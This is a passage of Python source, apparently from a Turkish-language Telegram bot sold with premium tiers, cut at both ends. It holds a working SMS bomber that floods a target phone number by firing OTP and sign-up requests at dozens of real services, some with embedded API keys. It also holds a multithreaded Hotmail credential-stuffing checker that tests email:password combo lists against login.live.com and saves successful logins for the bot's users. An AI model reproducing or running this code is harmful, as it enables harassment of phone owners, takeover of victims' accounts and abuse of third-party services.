                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Snapchat(self):
        try:
            r = requests.post("https://accounts.snapchat.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Pinterest(self):
        try:
            r = requests.post("https://www.pinterest.com/api/v1/users/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def LinkedIn(self):
        try:
            r = requests.post("https://www.linkedin.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Reddit(self):
        try:
            r = requests.post("https://www.reddit.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Twitch(self):
        try:
            r = requests.post("https://www.twitch.tv/api/v1/users/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Github(self):
        try:
            r = requests.post("https://github.com/api/v1/users/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Google(self):
        try:
            r = requests.post("https://accounts.google.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Microsoft(self):
        try:
            r = requests.post("https://signup.live.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Yahoo(self):
        try:
            r = requests.post("https://login.yahoo.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Apple(self):
        try:
            r = requests.post("https://appleid.apple.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Uber(self):
        try:
            r = requests.post("https://auth.uber.com/api/v1/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Tinder(self):
        try:
            r = requests.post("https://api.gotinder.com/v1/auth/register",
                data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Bim(self):
        try:
            r = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone":self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Sok(self):
        try:
            r = requests.post("https://api.ceptesok.com:443/api/users/sendsms", json={"mobile_number":self.phone,"token_type":"register_token"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Migros(self):
        try:
            r = requests.post("https://rest.migros.com.tr:443/sanalmarket/users/login/otp", json={"phoneNumber":self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def A101(self):
        try:
            r = requests.post("https://www.a101.com.tr:443/users/otp-login/", json={"phone":"0"+self.phone,"next":"/a101-kapida"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Sakasu(self):
        try:
            r = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data={"phone":"0"+self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Zarinplus(self):
        try:
            r = requests.post("https://api.zarinplus.com/user/zarinpal-login", json={"phone_number":"90"+self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Coregap(self):
        try:
            r = requests.post(f"https://core.gap.im/v1/user/add.json?mobile=90{self.phone}", timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Icq(self):
        try:
            url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{self.phone}&platform=ios&r=796356153&smsFormatType=human"
            r = requests.post(url, headers={"User-Agent":"ICQ iOS"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Rentiva(self):
        try:
            r = requests.post("https://rentiva.com:443/api/Account/Login", json={"phone":self.phone,"type":1}, headers={"Content-Type":"application/json"}, timeout=6)
            if r.status_code in [200,201,202]: self.adet += 1
        except: pass
    def Loncamarket(self):
        try:
            r = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", json={"Address":self.phone,"ConfirmationType":0}, timeout=6)
            if r.status_code in [200,201,202]: self.adet += 1
        except: pass
    def Tazi(self):
        try:
            r = requests.post("https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin",
                json={"cep_tel":self.phone,"cep_tel_ulkekod":"90"},
                headers={"Authorization":"Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD","Content-Type":"application/json"}, timeout=6)
            if r.status_code in [200,201,202]: self.adet += 1
        except: pass
    def Heyscooter(self):
        try:
            r = requests.post(f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=1&territoryId=738211d4", timeout=6)
            if r.status_code in [200,201,202]: self.adet += 1
        except: pass
    def Ipragaz(self):
        try:
            r = requests.post("https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp",
                json={"birthDate":"2/7/2000","carPlate":"31 ABC 31","name":"Memati Bas","phoneNumber":self.phone},
                headers={"Content-Type":"application/json"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Happy(self):
        try:
            r = requests.post("https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone",
                data={"telephone":self.phone},
                headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def KuryemGelsin(self):
        try:
            r = requests.post("https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/", json={"phoneNumber":self.phone,"phone_country_code":"+90"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Starbucks(self):
        try:
            r = requests.post("https://auth.sbuxtr.com:443/signUp",
                json={"allowEmail":True,"allowSms":True,"deviceId":"31","email":self.mail,"firstName":"Memati","lastName":"Bas","password":"31ABC..abc31","phoneNumber":self.phone,"preferredName":"Memati"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def BodrumBelediyesi(self):
        try:
            r = requests.post("https://gandalf.orwi.app:443/api/user/requestOtp",
                json={"gsm":"+90"+self.phone,"source":"orwi"},
                headers={"Apikey":"Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE","Content-Type":"application/json"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Englishhome(self):
        try:
            r = requests.post("https://www.englishhome.com:443/api/member/sendOtp",
                json={"Phone":self.phone,"XID":""},
                headers={"Content-Type":"application/json"}, timeout=6)
            if r.json().get("isError") == False: self.adet += 1
        except: pass
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn":"90"+self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Evidea(self):
        try:
            r = requests.post("https://www.evidea.com:443/users/register/",
                data={"first_name":"Memati","last_name":"Bas","email":self.mail,"email_allowed":"false","sms_allowed":"true","password":"31ABC..abc31","phone":"0"+self.phone,"confirm":"true"}, timeout=6)
            if r.status_code == 202: self.adet += 1
        except: pass
    def Hayatsu(self):
        try:
            r = requests.post("https://api.hayatsu.com.tr:443/api/SignUp/SendOtp", data={"mobilePhoneNumber":self.phone,"actionType":"register"}, timeout=6)
            if r.json().get("is_success") == True: self.adet += 1
        except: pass
    def Metro(self):
        try:
            r = requests.post("https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend", json={"methodType":"2","mobilePhoneNumber":self.phone}, timeout=6)
            if r.json().get("status") == "success": self.adet += 1
        except: pass
    def File(self):
        try:
            r = requests.post("https://api.filemarket.com.tr:443/v1/otp/send", json={"mobilePhoneNumber":"90"+self.phone}, timeout=6)
            if r.json().get("responseType") == "SUCCESS": self.adet += 1
        except: pass
    def Dominos(self):
        try:
            r = requests.post("https://frontend.dominos.com.tr:443/api/customer/sendOtpCode", json={"email":self.mail,"isSure":False,"mobilePhone":self.phone}, timeout=6)
            if r.json().get("isSuccess") == True: self.adet += 1
        except: pass
    def Orwi(self):
        try:
            r = requests.post("https://gandalf.orwi.app:443/api/user/requestOtp",
                json={"gsm":"+90"+self.phone,"source":"orwi"},
                headers={"Apikey":"YWxpLTEyMzQ1MTEyNDU2NTQzMg","Content-Type":"application/json"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Coffy(self):
        try:
            r = requests.post("https://user-api-gw.coffy.com.tr:443/user/signup",
                json={"countryCode":"90","gsm":self.phone,"isKVKKAgreementApproved":True,"isUserAgreementApproved":True,"name":"Memati Bas"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Hamidiye(self):
        try:
            r = requests.post("https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp", json={"isGuest":False,"phone":self.phone}, timeout=6)
            if r.json().get("result") == True: self.adet += 1
        except: pass
    def Money(self):
        try:
            r = requests.post("https://www.money.com.tr:443/Account/ValidateAndSendOTP", data={"phone":f"{self.phone[:3]} {self.phone[3:10]}","GRecaptchaResponse":""}, timeout=6)
            if r.json().get("resultType") == 0: self.adet += 1
        except: pass

def _get_sms_services():
    return [a for a in dir(SendSms) if callable(getattr(SendSms, a)) and not a.startswith('__') and a != 'adet']

def _sms_worker(phone, mail, mode, limit, interval, stop_event, uid, bot_instance):
    sms = SendSms(phone, mail)
    services = _get_sms_services()
    count = 0
    try:
        if mode == "turbo":
            while not stop_event.is_set():
                threads = []
                for fn in services:
                    if stop_event.is_set(): break
                    try:
                        t = threading.Thread(target=getattr(sms, fn), daemon=True)
                        threads.append(t); t.start()
                    except: pass
                for t in threads:
                    try: t.join(timeout=5)
                    except: pass
                count += len(services)
                with _SMS_LOCK:
                    if uid in _SMS_SESSIONS: _SMS_SESSIONS[uid]["count"] = count
        else:
            while not stop_event.is_set():
                for fn in services:
                    if stop_event.is_set(): break
                    if limit and count >= limit:
                        stop_event.set(); break
                    try:
                        getattr(sms, fn)()
                        count += 1
                        with _SMS_LOCK:
                            if uid in _SMS_SESSIONS: _SMS_SESSIONS[uid]["count"] = count
                    except: pass
                if interval > 0: stop_event.wait(interval)
    except: pass
    finally:
        with _SMS_LOCK:
            if uid in _SMS_SESSIONS:
                _SMS_SESSIONS[uid]["running"] = False
                _SMS_SESSIONS[uid]["count"] = count

def _launch_sms_bomb(uid, phone, mail, mode, limit, interval, bot_instance):
    with _SMS_LOCK:
        if uid in _SMS_SESSIONS and _SMS_SESSIONS[uid].get("running"):
            bot_instance.send_message(uid, "⚠️ Aktif bombardıman var!\n/smsstop", parse_mode="HTML"); return
    stop_event = threading.Event()
    services = _get_sms_services()
    mode_txt = "🚀 Turbo" if mode == "turbo" else "⚡ Normal"
    limit_txt = str(limit) if limit else "Sonsuz ♾️"
    interval_txt = f"{interval}s" if mode == "normal" else "Maksimum Hız"
    bot_instance.send_message(uid,
        f"💣 <b>SMS Bomber Başladı!</b>\n"
        f"📱 Hedef: <code>{esc(phone)}</code>\n"
        f"📊 Servis: <b>{len(services)}</b>\n"
        f"⚙️ Mod: <b>{mode_txt}</b>\n"
        f"🔢 Limit: <b>{limit_txt}</b>\n"
        f"⏱ Aralık: <b>{interval_txt}</b>\n"
        f"🛑 Durdur: /smsstop\n📊 Durum: /smsstatus", parse_mode="HTML")
    t = threading.Thread(target=_sms_worker, args=(phone, mail, mode, limit, interval, stop_event, uid, bot_instance), daemon=True)
    with _SMS_LOCK:
        _SMS_SESSIONS[uid] = {"running":True,"thread":t,"event":stop_event,"count":0,
                              "target":phone,"mode":mode,
                              "start_time":datetime.now().strftime("%H:%M:%S"),
                              "services":len(services)}
    t.start()

def _sms_step1_number(msg, bot_instance):
    uid = msg.from_user.id
    phone = msg.text.strip()
    if not (phone.isdigit() and len(phone) == 10):
        bot_instance.reply_to(msg, "❌ Geçersiz! 10 haneli olmalı.", parse_mode="HTML"); return
    m = bot_instance.reply_to(msg, f"📱 Hedef: <code>{esc(phone)}</code>\n📧 Mail girin (- = rastgele):", parse_mode="HTML")
    bot_instance.register_next_step_handler(m, lambda m: _sms_step2_mail(m, phone, bot_instance))

def _sms_step2_mail(msg, phone, bot_instance):
    mail = msg.text.strip()
    if mail == "-": mail = ""
    if mail and ("@" not in mail or "." not in mail): mail = ""
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(InlineKeyboardButton("⚡ Normal", callback_data=f"sms_normal_{phone}_{mail}"),
           InlineKeyboardButton("🚀 Turbo", callback_data=f"sms_turbo_{phone}_{mail}"))
    bot_instance.reply_to(msg, f"📱 <code>{esc(phone)}</code>\n📧 <code>{esc(mail or 'Rastgele')}</code>\n⚙️ Mod seçin:", reply_markup=mk, parse_mode="HTML")

def _sms_normal_settings(msg, phone, mail, bot_instance):
    uid = msg.from_user.id
    try:
        parts = msg.text.strip().split()
        limit = int(parts[0]) if parts else 0
        interval = float(parts[1]) if len(parts) > 1 else 0
    except: limit = 0; interval = 0
    if limit < 0: limit = 0
    if interval < 0: interval = 0
    _launch_sms_bomb(uid, phone, mail, "normal", limit, interval, bot_instance)

# ══════════════════════════════════════════════════════════════
#  HOTMAIL
# ══════════════════════════════════════════════════════════════
HOTMAIL_QUEUE = queue.Queue()
HOTMAIL_CURRENT_TASK = None
HOTMAIL_QUEUE_LOCK = threading.Lock()
HOTMAIL_QUEUE_RUNNING = False
HOTMAIL_QUEUE_THREAD = None
HOTMAIL_THREADS = 10
HOTMAIL_HIT = 0; HOTMAIL_BAD = 0; HOTMAIL_ERROR = 0; HOTMAIL_2FA = 0
HOTMAIL_REWARDS = 0; HOTMAIL_PROCESSED = 0
HOTMAIL_LOCK = threading.Lock()
HOTMAIL_KEYWORD_HITS = {}; HOTMAIL_COUNTRY_HITS = {}; HOTMAIL_START_TIME = None

def _get_login_session(proxy=None):
    session = requests.Session()
    session.headers.update({"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                            "Accept-Language":"en-US,en;q=0.9","DNT":"1","Connection":"keep-alive"})
    if proxy: session.proxies = {"http":proxy,"https":proxy}
    return session

def _extract_login_params(session, email):
    try:
        url = "https://login.live.com/oauth20_authorize.srf"
        params = {"client_id":"e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                  "redirect_uri":"https://login.live.com/oauth20_desktop.srf",
                  "response_type":"code","scope":"openid profile email",
                  "login_hint":email,"mkt":"en-US"}
        resp = session.get(url, params=params, timeout=15, allow_redirects=True)
        text = resp.text
        ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', text)
        ppft = ppft_match.group(1) if ppft_match else None
        url_post_match = re.search(r'urlPost:[\'"]?([^\'",}]+)', text)
        url_post = url_post_match.group(1) if url_post_match else "https://login.live.com/ppsecure/post.srf"
        flow_token_match = re.search(r'"sFT":"([^"]+)"', text)
        flow_token = flow_token_match.group(1) if flow_token_match else ppft
        return {"success":True,"ppft":flow_token or ppft,"url_post":url_post,
                "cookies":session.cookies.get_dict()}
    except Exception as e:
        return {"success": False, "error": str(e)}

def _check_hotmail_oauth(email, password, proxy=None, max_retries=3):
    for attempt in range(max_retries):
        session = _get_login_session(proxy)
        try:
            params = _extract_login_params(session, email)
            if not params["success"]:
                if attempt < max_retries - 1: time.sleep(1); continue
                return {"status":"error","detail":params.get("error","")}
            ppft = params["ppft"]; url_post = params["url_post"]; cookies = params["cookies"]
            login_data = {"login":email,"loginfmt":email,"type":"11","LoginOptions":"3",
                          "passwd":password,"KMSI":"1","NewUser":"1","PPFT":ppft,"PPSX":"Pa",
                          "i13":"0","ps":"2","fspost":"0","CookieDisclosure":"0",
                          "IsFidoSupported":"1","isSignupPost":"0","isRecoveryAttemptPost":"0","i19":"0"}
            cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
            headers = {"Content-Type":"application/x-www-form-urlencoded","Origin":"https://login.live.com",
                       "Referer":"https://login.live.com/","Cookie":cookie_str}
            resp = session.post(url_post, data=login_data, headers=headers, timeout=20, allow_redirects=False)
            text = resp.text; status_code = resp.status_code
            location = resp.headers.get('Location','')
            if 'code=' in location: return {"status":"hit","email":email,"password":password}
            if any(x in text.lower() for x in ["two-step","authenticator","proofup","mfa"]): return {"status":"2fa","email":email,"password":password}
            if any(x in text.lower() for x in ["incorrect password","wrong password"]): return {"status":"bad","email":email,"password":password}
            if any(x in text.lower() for x in ["captcha","recaptcha"]): return {"status":"captcha","email":email,"password":password}
            if any(x in text.lower() for x in ["locked","suspended"]): return {"status":"locked","email":email,"password":password}
            return {"status":"error","email":email,"password":password}
        except: 
            if attempt < max_retries - 1: time.sleep(1); continue
            return {"status":"error","detail":"exception"}
        finally: session.close()

@dataclass
class HotmailTask:
    user_id: int; user_name: str; combo_list: list; thread_count: int
    status_msg_id: int; chat_id: int; is_premium: bool = False
    task_id: str = None; queue_position: int = 0; keywords: list = None
    def __post_init__(self):
        if not self.task_id: self.task_id = f"{self.user_id}_{datetime.now().strftime('%Y%m%d%H%M%S')}"
        if not self.keywords: self.keywords = get_user_keywords(self.user_id)

def hotmail_worker(combo_line, user_id, user_name, is_premium, keywords):
    global HOTMAIL_HIT, HOTMAIL_BAD, HOTMAIL_ERROR, HOTMAIL_2FA, HOTMAIL_PROCESSED
    global HOTMAIL_KEYWORD_HITS, HOTMAIL_COUNTRY_HITS
    try:
        if ":" not in combo_line:
            with HOTMAIL_LOCK: HOTMAIL_BAD += 1; HOTMAIL_PROCESSED += 1
            return
        email, password = combo_line.split(":", 1)
        email = email.strip(); password = password.strip()
        if not email or not password:
            with HOTMAIL_LOCK: HOTMAIL_BAD += 1; HOTMAIL_PROCESSED += 1
            return
        time.sleep(0.1)
        result = _check_hotmail_oauth(email, password)
        status = result["status"]
        with HOTMAIL_LOCK:
            HOTMAIL_PROCESSED += 1
            if status == "hit":
                HOTMAIL_HIT += 1
                save_hotmail_log(user_id, user_name, email, password, "HIT", "")
                for kw in keywords:
                    if kw.lower() in email.lower():
                        HOTMAIL_KEYWORD_HITS[kw] = HOTMAIL_KEYWORD_HITS.get(kw, 0) + 1; break
                if '.' in email:
                    d = email.split('.')[-1].upper()
                    if len(d) == 2: HOTMAIL_COUNTRY_HITS[d] = HOTMAIL_COUNTRY_HITS.get(d, 0) + 1
                with open(f"hits_{user_id}.txt", "a", encoding="utf-8") as f: f.write(f"{email}:{password}\n")
            elif status == "2fa": HOTMAIL_2FA += 1
            elif status == "captcha": HOTMAIL_ERROR += 1
            elif status == "locked": HOTMAIL_ERROR += 1
            elif status == "bad": HOTMAIL_BAD += 1
            else: HOTMAIL_ERROR += 1
    except:
        with HOTMAIL_LOCK: HOTMAIL_ERROR += 1; HOTMAIL_PROCESSED += 1

def process_hotmail_queue():
    global HOTMAIL_CURRENT_TASK, HOTMAIL_QUEUE_RUNNING, main_bot
    global HOTMAIL_HIT, HOTMAIL_BAD, HOTMAIL_ERROR, HOTMAIL_2FA
    global HOTMAIL_KEYWORD_HITS, HOTMAIL_COUNTRY_HITS, HOTMAIL_START_TIME
    while HOTMAIL_QUEUE_RUNNING:
        try:
            try: task = HOTMAIL_QUEUE.get(timeout=5)
            except queue.Empty: continue
            HOTMAIL_START_TIME = time.time()
            HOTMAIL_HIT = 0; HOTMAIL_BAD = 0; HOTMAIL_ERROR = 0; HOTMAIL_2FA = 0
            HOTMAIL_KEYWORD_HITS = {}; HOTMAIL_COUNTRY_HITS = {}
            with HOTMAIL_QUEUE_LOCK:
                HOTMAIL_CURRENT_TASK = {"user_id":task.user_id,"user_name":task.user_name}
            try:
                if main_bot:
                    main_bot.edit_message_text(
                        f"🚀 <b>Hotmail Başladı!</b>\n👤 {esc(task.user_name)}\n📂 {len(task.combo_list)} satır",
                        task.chat_id, task.status_msg_id, parse_mode="HTML")
            except: pass
            try:
                with ThreadPoolExecutor(max_workers=task.thread_count) as executor:
                    futures = []
                    for line in task.combo_list:
                        futures.append(executor.submit(hotmail_worker, line, task.user_id, task.user_name, task.is_premium, task.keywords))
                    processed = 0; total = len(task.combo_list)
                    for future in as_completed(futures):
                        processed += 1
                        try: future.result()
                        except: pass
                        if processed % 10 == 0 or processed == total:
                            try:
                                if main_bot:
                                    main_bot.edit_message_text(
                                        f"🚀 <b>Hotmail Çalışıyor</b>\n"
                                        f"📂 {processed}/{total}\n✅ Hit: {HOTMAIL_HIT} | ❌ Bad: {HOTMAIL_BAD}\n"
                                        f"🔐 2FA: {HOTMAIL_2FA} | ⚠️ Error: {HOTMAIL_ERROR}",
                                        task.chat_id, task.status_msg_id, parse_mode="HTML")
                            except: pass
            except: pass
            elapsed = int(time.time() - HOTMAIL_START_TIME)
            total = HOTMAIL_HIT + HOTMAIL_BAD + HOTMAIL_ERROR + HOTMAIL_2FA
            rt = [f"✅ <b>Tarama Tamamlandı!</b>","━━━━━━━━━━━━━━━━━━━━━",
                  f"📊 Toplam: {total}","",f"✅ HIT: {HOTMAIL_HIT}",f"🔐 2FA: {HOTMAIL_2FA}",
                  f"❌ BAD: {HOTMAIL_BAD}",f"⚠️ ERROR: {HOTMAIL_ERROR}","",f"⏰ {elapsed} sn"]
            try:
                if main_bot:
                    main_bot.edit_message_text("\n".join(rt), task.chat_id, task.status_msg_id, parse_mode="HTML")
                    hf = f"hits_{task.user_id}.txt"
                    if os.path.exists(hf) and os.path.getsize(hf) > 0:
                        with open(hf, "rb") as f:
                            main_bot.send_document(task.chat_id, f, caption=f"✅ {HOTMAIL_HIT}x Hit")
                        os.remove(hf)
            except: pass
            with HOTMAIL_QUEUE_LOCK: HOTMAIL_CURRENT_TASK = None
        except Exception as e:
            print(f"[QUEUE ERROR] {e}")
            with HOTMAIL_QUEUE_LOCK: HOTMAIL_CURRENT_TASK = None

def start_queue_processor():
    global HOTMAIL_QUEUE_RUNNING, HOTMAIL_QUEUE_THREAD
    if HOTMAIL_QUEUE_RUNNING: return
    HOTMAIL_QUEUE_RUNNING = True
    HOTMAIL_QUEUE_THREAD = threading.Thread(target=process_hotmail_queue, daemon=True)
    HOTMAIL_QUEUE_THREAD.start()

def add_to_queue(task):
    with HOTMAIL_QUEUE_LOCK:
        position = HOTMAIL_QUEUE.qsize() + 1
        if HOTMAIL_CURRENT_TASK: position += 1
        task.queue_position = position
        HOTMAIL_QUEUE.put(task)
        try:
            if main_bot:
                is_prem = task.is_premium
                limit_text = f"{PREMIUM_CHECK_LIMIT}" if is_prem else f"{FREE_CHECK_LIMIT}"
                main_bot.send_message(task.chat_id,
                    f"🚀 <b>Sıraya alındı</b>\n⏳ <b>Sıra:</b> {position}\n📊 <b>Limit:</b> {limit_text}",
                    parse_mode="HTML")
        except: pass

def _process_hotmail_file(msg, bot_instance):
    uid = msg.from_user.id
    if not msg.document:
        bot_instance.reply_to(msg, "❌ Dosya gönderin!", parse_mode="HTML"); return
    try:
        file_info = bot_instance.get_file(msg.document.file_id)
        downloaded = bot_instance.download_file(file_info.file_path)
        combo_text = downloaded.decode("utf-8", errors="ignore")
        combo_list = [l.strip() for l in combo_text.splitlines() if l.strip() and ":" in l.strip()]
        if not combo_list:
            bot_instance.reply_to(msg, "❌ Combo bulunamadı!", parse_mode="HTML"); return
        is_prem = is_premium(uid)
        max_lines = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
        if len(combo_list) > max_lines:
            bot_instance.reply_to(msg, f"⚠️ Limit aşıldı! Max: {max_lines}", parse_mode="HTML"); return
        m = bot_instance.reply_to(msg, f"✅ <b>{len(combo_list)}</b> satır.\n⚙️ Thread (10-100):", parse_mode="HTML")
        bot_instance.register_next_step_handler(m, lambda m: _start_hotmail_scan_queue(m, combo_list, bot_instance))
    except Exception as e:
        bot_instance.reply_to(msg, f"❌ Hata: {esc(e)}", parse_mode="HTML")

def _start_hotmail_scan_queue(msg, combo_list, bot_instance):
    uid = msg.from_user.id
    global HOTMAIL_THREADS
    try:
        tc = int(msg.text.strip())
        if tc < 1: tc = 10
        elif tc > 100: tc = 100
    except: tc = 10
    HOTMAIL_THREADS = tc
    is_prem = is_premium(uid)
    user_name = get_user_name(uid)
    keywords = get_user_keywords(uid)
    start_queue_processor()
    status_msg = bot_instance.reply_to(msg,
        f"⏳ <b>Sıraya alınıyor...</b>\n👤 {esc(user_name)}\n📂 {len(combo_list)} satır\n⚙️ Thread: {tc}",
        parse_mode="HTML")
    task = HotmailTask(user_id=uid, user_name=user_name, combo_list=combo_list,
                       thread_count=tc, status_msg_id=status_msg.message_id,
                       chat_id=msg.chat.id, is_premium=is_prem, keywords=keywords)
    add_to_queue(task)

def get_queue_status_text(user_id=None):
    with HOTMAIL_QUEUE_LOCK:
        lines = ["⏳ <b>BEKLEYENLER</b>", "━━━━━━━━━━━━━━━━━━━━━"]
        if HOTMAIL_CURRENT_TASK:
            t = HOTMAIL_CURRENT_TASK
            lines.append(f"🔄 {esc(t.get('user_name'))} İşleniyor")
        else: lines.append("⏸️ İşlem yok")
        ql = list(HOTMAIL_QUEUE.queue)
        if ql:
            for i, t in enumerate(ql, 1):
                lines.append(f"  {i}. {esc(t.user_name)} ({len(t.combo_list)} satır)")
        else: lines.append("📭 Bekleyen yok")
        return "\n".join(lines)

# ══════════════════════════════════════════════════════════════
#  HANDLERS
# ══════════════════════════════════════════════════════════════
main_bot = None

def register_handlers(bot_instance):
    global main_bot
    main_bot = bot_instance

    @bot_instance.message_handler(commands=["start"])
    def cmd_start(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 <b>YASAKLANDINIZ!</b>\nSebep: {esc(get_ban_reason(uid))}", parse_mode="HTML")
            return
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
        mk = InlineKeyboardMarkup(row_width=3)
        mk.add(_btn("🇹🇷 Türkçe", "lang_tr"), _btn("🇬🇧 English", "lang_en"), _btn("🇸🇦 العربية", "lang_ar"))
        bot_instance.reply_to(msg, s(uid, "lang_pick"), reply_markup=mk)

    @bot_instance.message_handler(commands=["premium"])
    def cmd_premium(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫 <b>YASAKLANDINIZ!</b>", parse_mode="HTML"); return
        if is_premium(uid):
            bot_instance.reply_to(msg, s(uid, "already_premium"), parse_mode="HTML"); return
        txt = (f"{s(uid, 'premium_title')}\n"
               f"━━━━━━━━━━━━━━━━━━━━━\n"
               f"{s(uid, 'premium_price_txt', price=PREMIUM_PRICE)}\n"
               f"{s(uid, 'premium_dur')}\n"
               f"{s(uid, 'premium_features')}")
        bot_instance.reply_to(msg, txt, reply_markup=premium_kb(uid), parse_mode="HTML")

    @bot_instance.message_handler(commands=["hotmail"])
    def cmd_hotmail(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫 <b>YASAKLANDINIZ!</b>", parse_mode="HTML"); return
        user_name = esc(get_user_name(uid))
        keywords = get_user_keywords(uid)
        limit_text = get_keyword_limit_text(uid)
        is_prem = is_premium(uid)
        capture_left = get_capture_limit_text(uid)
        bot_instance.reply_to(msg,
            f"📧 <b>HOTMAIL CHECKER & CAPTURE</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 {user_name}\n"
            f"🔖 {esc(', '.join(keywords))}\n"
            f"📧 Hotmail: {'⭐ Premium' if is_prem else f'🆓 Free ({FREE_CHECK_LIMIT})'}\n"
            f"📸 Capture: {'⭐ Premium' if is_prem else f'🆓 Free ({capture_left})'}",
            reply_markup=hotmail_keyboard(uid), parse_mode="HTML")

    @bot_instance.message_handler(commands=["queue", "sıra"])
    def cmd_queue_status(msg):
        bot_instance.reply_to(msg, get_queue_status_text(msg.from_user.id), parse_mode="HTML")

    @bot_instance.message_handler(commands=["profil"])
    def cmd_profile(msg):
        _show_profile(msg.chat.id, msg.from_user.id, bot_instance)

    @bot_instance.message_handler(commands=["istatistik"])
    def cmd_stats_detailed(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫", parse_mode="HTML"); return
        tu, prem_pu, osint_pu, tc, tch = get_bot_stats()
        bot_instance.reply_to(msg,
